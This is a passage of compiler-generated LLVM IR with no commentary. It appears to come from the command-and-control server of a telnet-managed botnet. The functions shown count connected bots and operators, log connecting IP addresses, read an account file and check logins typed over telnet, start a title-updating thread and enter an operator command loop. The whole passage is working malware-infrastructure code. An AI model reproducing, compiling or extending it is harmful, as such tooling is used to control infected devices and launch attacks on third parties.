  store i8* %0, i8** %3, align 8
  %6 = load i8*, i8** %3, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %21, %1
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 2048, i32 16, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %11 = call i32 @clientsConnected()
  %12 = load volatile i32, i32* @managesConnected, align 4
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i32 27, i32 %11, i32 %12, i32 7) #7
  %14 = load i32, i32* %4, align 4
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %17 = call i64 @strlen(i8* %16) #8
  %18 = call i64 @send(i32 %14, i8* %15, i64 %17, i32 16384)
  %19 = icmp eq i64 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %8
  br label %21

; <label>:21:                                     ; preds = %20, %8
  %22 = call i32 @sleep(i32 2)
  br label %8
                                                  ; No predecessors!
  %24 = load i8*, i8** %2, align 8
  ret i8* %24
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

; <label>:23:                                     ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

; <label>:27:                                     ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13

; <label>:30:                                     ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

; <label>:33:                                     ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

; <label>:36:                                     ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

; <label>:40:                                     ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

; <label>:42:                                     ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i32 0, i32 0), i32 %11, i32 %16, i32 %21, i32 %26)
  %28 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.14, i32 0, i32 0), i32 %33, i32 %38, i32 %43, i32 %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* %50)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [90000 x i8], align 16
  %22 = alloca [90000 x i8], align 16
  %23 = alloca [90000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [5000 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [5000 x i8], align 16
  %87 = alloca [5000 x i8], align 16
  %88 = alloca [5000 x i8], align 16
  %89 = alloca [5000 x i8], align 16
  %90 = alloca [5000 x i8], align 16
  %91 = alloca [5000 x i8], align 16
  %92 = alloca [5000 x i8], align 16
  %93 = alloca [5000 x i8], align 16
  %94 = alloca [5000 x i8], align 16
  %95 = alloca [5000 x i8], align 16
  %96 = alloca [5000 x i8], align 16
  %97 = alloca [5000 x i8], align 16
  %98 = alloca %struct._IO_FILE*, align 8
  %99 = alloca %struct._IO_FILE*, align 8
  %100 = alloca %struct._IO_FILE*, align 8
  %101 = alloca [100 x i8*], align 16
  %102 = alloca i8*, align 8
  %103 = alloca i8*, align 8
  %104 = alloca i8*, align 8
  %105 = alloca i8*, align 8
  %106 = alloca [50 x i8*], align 16
  %107 = alloca [100 x i8*], align 16
  %108 = alloca [100 x i8*], align 16
  %109 = alloca [100 x i8*], align 16
  %110 = alloca [50 x i8*], align 16
  %111 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %112 = load i8*, i8** %3, align 8
  %113 = ptrtoint i8* %112 to i32
  store i32 %113, i32* %4, align 4
  %114 = load volatile i32, i32* @managesConnected, align 4
  %115 = add nsw i32 %114, 1
  store volatile i32 %115, i32* @managesConnected, align 4
  %116 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %116, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0), i8** %12, align 8
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %117, i8 0, i64 2048, i32 16, i1 false)
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %118, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %15, align 4
  %119 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %119, %struct._IO_FILE** %14, align 8
  br label %120

; <label>:120:                                    ; preds = %125, %1
  %121 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %122 = call i32 @feof(%struct._IO_FILE* %121) #7
  %123 = icmp ne i32 %122, 0
  %124 = xor i1 %123, true
  br i1 %124, label %125, label %130

; <label>:125:                                    ; preds = %120
  %126 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %127 = call i32 @fgetc(%struct._IO_FILE* %126)
  store i32 %127, i32* %16, align 4
  %128 = load i32, i32* %15, align 4
  %129 = add nsw i32 %128, 1
  store i32 %129, i32* %15, align 4
  br label %120

; <label>:130:                                    ; preds = %120
  store i32 0, i32* %17, align 4
  %131 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %131)
  br label %132

; <label>:132:                                    ; preds = %137, %130
  %133 = load i32, i32* %17, align 4
  %134 = load i32, i32* %15, align 4
  %135 = sub nsw i32 %134, 1
  %136 = icmp ne i32 %133, %135
  br i1 %136, label %137, label %157

; <label>:137:                                    ; preds = %132
  %138 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %139 = load i32, i32* %17, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %140
  %142 = getelementptr inbounds %struct.account, %struct.account* %141, i32 0, i32 0
  %143 = getelementptr inbounds [20 x i8], [20 x i8]* %142, i32 0, i32 0
  %144 = load i32, i32* %17, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %145
  %147 = getelementptr inbounds %struct.account, %struct.account* %146, i32 0, i32 1
  %148 = getelementptr inbounds [20 x i8], [20 x i8]* %147, i32 0, i32 0
  %149 = load i32, i32* %17, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %150
  %152 = getelementptr inbounds %struct.account, %struct.account* %151, i32 0, i32 2
  %153 = getelementptr inbounds [20 x i8], [20 x i8]* %152, i32 0, i32 0
  %154 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %138, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.16, i32 0, i32 0), i8* %143, i8* %148, i8* %153)
  %155 = load i32, i32* %17, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %17, align 4
  br label %132

; <label>:157:                                    ; preds = %132
  %158 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %159 = call i32 (i8*, i8*, ...) @sprintf(i8* %158, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.17, i32 0, i32 0)) #7
  %160 = load i32, i32* %4, align 4
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %163 = call i64 @strlen(i8* %162) #8
  %164 = call i64 @send(i32 %160, i8* %161, i64 %163, i32 16384)
  %165 = icmp eq i64 %164, -1
  br i1 %165, label %166, label %167

; <label>:166:                                    ; preds = %157
  br label %2101

; <label>:167:                                    ; preds = %157
  %168 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %169 = call i32 (i8*, i8*, ...) @sprintf(i8* %168, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.18, i32 0, i32 0)) #7
  %170 = load i32, i32* %4, align 4
  %171 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %173 = call i64 @strlen(i8* %172) #8
  %174 = call i64 @send(i32 %170, i8* %171, i64 %173, i32 16384)
  %175 = icmp eq i64 %174, -1
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %167
  br label %2101

; <label>:177:                                    ; preds = %167
  %178 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %179 = load i32, i32* %4, align 4
  %180 = call i32 @fdgets(i8* %178, i32 2048, i32 %179)
  %181 = icmp slt i32 %180, 1
  br i1 %181, label %182, label %183

; <label>:182:                                    ; preds = %177
  br label %2101

; <label>:183:                                    ; preds = %177
  %184 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %184)
  %185 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  %186 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %185, i8* %186) #7
  %188 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  store i8* %188, i8** %9, align 8
  %189 = load i8*, i8** %9, align 8
  %190 = call i32 @Search_in_File(i8* %189)
  store i32 %190, i32* %5, align 4
  %191 = load i8*, i8** %9, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %193
  %195 = getelementptr inbounds %struct.account, %struct.account* %194, i32 0, i32 0
  %196 = getelementptr inbounds [20 x i8], [20 x i8]* %195, i32 0, i32 0
  %197 = call i32 @strcmp(i8* %191, i8* %196) #8
  %198 = icmp eq i32 %197, 0
  br i1 %198, label %199, label %228

; <label>:199:                                    ; preds = %183
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %201 = call i32 (i8*, i8*, ...) @sprintf(i8* %200, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i32 0, i32 0)) #7
  %202 = load i32, i32* %4, align 4
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %205 = call i64 @strlen(i8* %204) #8
  %206 = call i64 @send(i32 %202, i8* %203, i64 %205, i32 16384)
  %207 = icmp eq i64 %206, -1
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %199
  br label %2101

; <label>:209:                                    ; preds = %199
  %210 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %211 = load i32, i32* %4, align 4
  %212 = call i32 @fdgets(i8* %210, i32 2048, i32 %211)
  %213 = icmp slt i32 %212, 1
  br i1 %213, label %214, label %215

; <label>:214:                                    ; preds = %209
  br label %2101

; <label>:215:                                    ; preds = %209
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %216)
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %218 = load i32, i32* %5, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %219
  %221 = getelementptr inbounds %struct.account, %struct.account* %220, i32 0, i32 1
  %222 = getelementptr inbounds [20 x i8], [20 x i8]* %221, i32 0, i32 0
  %223 = call i32 @strcmp(i8* %217, i8* %222) #8
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %215
  br label %229

; <label>:226:                                    ; preds = %215
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %227, i8 0, i64 2048, i32 16, i1 false)
  br label %265

; <label>:228:                                    ; preds = %183
  br label %229

; <label>:229:                                    ; preds = %228, %225
  %230 = load i8*, i8** %3, align 8
  %231 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %230) #7
  %232 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %232, i8 0, i64 2048, i32 16, i1 false)
  %233 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %234 = call i32 (i8*, i8*, ...) @sprintf(i8* %233, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.21, i32 0, i32 0)) #7
  %235 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %236 = call i32 (i8*, i8*, ...) @sprintf(i8* %235, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.22, i32 0, i32 0)) #7
  %237 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %238 = call i32 (i8*, i8*, ...) @sprintf(i8* %237, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.23, i32 0, i32 0)) #7
  %239 = call i32 @sleep(i32 1)
  %240 = load i32, i32* %4, align 4
  %241 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i32 0, i32 0
  %243 = call i64 @strlen(i8* %242) #8
  %244 = call i64 @send(i32 %240, i8* %241, i64 %243, i32 16384)
  %245 = icmp eq i64 %244, -1
  br i1 %245, label %246, label %247

; <label>:246:                                    ; preds = %229
  br label %2101

; <label>:247:                                    ; preds = %229
  %248 = load i32, i32* %4, align 4
  %249 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %250 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i32 0, i32 0
  %251 = call i64 @strlen(i8* %250) #8
  %252 = call i64 @send(i32 %248, i8* %249, i64 %251, i32 16384)
  %253 = icmp eq i64 %252, -1
  br i1 %253, label %254, label %255

; <label>:254:                                    ; preds = %247
  br label %2101

; <label>:255:                                    ; preds = %247
  %256 = load i32, i32* %4, align 4
  %257 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %258 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i32 0, i32 0
  %259 = call i64 @strlen(i8* %258) #8
  %260 = call i64 @send(i32 %256, i8* %257, i64 %259, i32 16384)
  %261 = icmp eq i64 %260, -1
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %255
  br label %2101

; <label>:263:                                    ; preds = %255
  %264 = call i32 @sleep(i32 7)
  br label %2101

; <label>:265:                                    ; preds = %2044, %2039, %2034, %2029, %226
  %266 = load i8*, i8** %3, align 8
  %267 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %266) #7
  %268 = load i32, i32* %4, align 4
  %269 = call i64 @send(i32 %268, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %270 = icmp eq i64 %269, -1
  br i1 %270, label %271, label %272

; <label>:271:                                    ; preds = %265
  br label %2101

; <label>:272:                                    ; preds = %265
  %273 = load i32, i32* %4, align 4
  %274 = call i64 @send(i32 %273, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i64 2, i32 16384)
  %275 = icmp eq i64 %274, -1
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %272
  br label %2101

; <label>:277:                                    ; preds = %272
  %278 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %279 = call i32 (i8*, i8*, ...) @sprintf(i8* %278, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.26, i32 0, i32 0)) #7
  %280 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* %280, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.27, i32 0, i32 0)) #7
  %282 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %283 = call i32 (i8*, i8*, ...) @sprintf(i8* %282, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.28, i32 0, i32 0)) #7
  %284 = load i32, i32* %4, align 4
  %285 = call i64 @send(i32 %284, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i64 14, i32 16384)
  %286 = icmp eq i64 %285, -1
  br i1 %286, label %287, label %288

; <label>:287:                                    ; preds = %277
  br label %2101

; <label>:288:                                    ; preds = %277
  %289 = load i32, i32* %4, align 4
  %290 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %291 = getelementptr inbounds [90000 x i8], [90000 x i8]* %21, i32 0, i32 0
  %292 = call i64 @strlen(i8* %291) #8
  %293 = call i64 @send(i32 %289, i8* %290, i64 %292, i32 16384)
  %294 = icmp eq i64 %293, -1
  br i1 %294, label %295, label %296

; <label>:295:                                    ; preds = %288
  br label %2101

; <label>:296:                                    ; preds = %288
  %297 = load i32, i32* %4, align 4
  %298 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %299 = getelementptr inbounds [90000 x i8], [90000 x i8]* %22, i32 0, i32 0
  %300 = call i64 @strlen(i8* %299) #8
  %301 = call i64 @send(i32 %297, i8* %298, i64 %300, i32 16384)
  %302 = icmp eq i64 %301, -1
  br i1 %302, label %303, label %304

; <label>:303:                                    ; preds = %296
  br label %2101

; <label>:304:                                    ; preds = %296
  %305 = load i32, i32* %4, align 4
  %306 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %307 = getelementptr inbounds [90000 x i8], [90000 x i8]* %23, i32 0, i32 0
  %308 = call i64 @strlen(i8* %307) #8
  %309 = call i64 @send(i32 %305, i8* %306, i64 %308, i32 16384)
  %310 = icmp eq i64 %309, -1
  br i1 %310, label %311, label %312

; <label>:311:                                    ; preds = %304
  br label %2101

; <label>:312:                                    ; preds = %304
  br label %313

; <label>:313:                                    ; preds = %312
  %314 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %315 = load i32, i32* %5, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %316
  %318 = getelementptr inbounds %struct.account, %struct.account* %317, i32 0, i32 0
  %319 = getelementptr inbounds [20 x i8], [20 x i8]* %318, i32 0, i32 0
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %321 = call i32 (i8*, i8*, ...) @sprintf(i8* %314, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %319, i8* %320) #7
  %322 = load i32, i32* %4, align 4
  %323 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %324 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %325 = call i64 @strlen(i8* %324) #8
  %326 = call i64 @send(i32 %322, i8* %323, i64 %325, i32 16384)
  %327 = icmp eq i64 %326, -1
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %313
  br label %2101

; <label>:329:                                    ; preds = %313
  br label %330

; <label>:330:                                    ; preds = %329
  %331 = load i8*, i8** %3, align 8
  %332 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %331) #7
  %333 = load i32, i32* %4, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %334
  %336 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %335, i32 0, i32 1
  store i32 1, i32* %336, align 4
  br label %337

; <label>:337:                                    ; preds = %2077, %2076, %1377, %1254, %989, %896, %739, %620, %513, %330
  %338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %339 = load i32, i32* %4, align 4
  %340 = call i32 @fdgets(i8* %338, i32 2048, i32 %339)
  %341 = icmp sgt i32 %340, 0
  br i1 %341, label %342, label %2100

; <label>:342:                                    ; preds = %337
